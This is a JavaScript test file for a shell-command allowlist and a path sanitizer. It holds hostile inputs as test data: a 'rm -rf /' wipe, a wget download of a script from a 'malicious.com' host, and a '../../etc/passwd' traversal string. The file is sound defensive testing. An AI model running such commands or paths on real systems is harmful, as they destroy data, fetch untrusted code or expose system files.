import assert from 'node:assert';
import { test } from 'node:test';
import { validateShellCommand, sanitizePath } from '../middleware/auth';

test('Security Protection: validateShellCommand allowlist checks', () => {
  assert.strictEqual(validateShellCommand('npm run build'), true);
  assert.strictEqual(validateShellCommand('git pull origin main'), true);
  assert.strictEqual(validateShellCommand('certbot renew'), true);
  assert.strictEqual(validateShellCommand('rm -rf /'), false);
  assert.strictEqual(validateShellCommand('wget http://malicious.com/script.sh'), false);
});

test('Security Protection: sanitizePath path traversal protection', () => {
  const base = '/var/www';
  assert.strictEqual(sanitizePath(base, 'site1/index.html'), '/var/www/site1/index.html');
  assert.throws(() => {
    sanitizePath(base, '../../etc/passwd');
  }, /Path traversal attempt detected/);
});
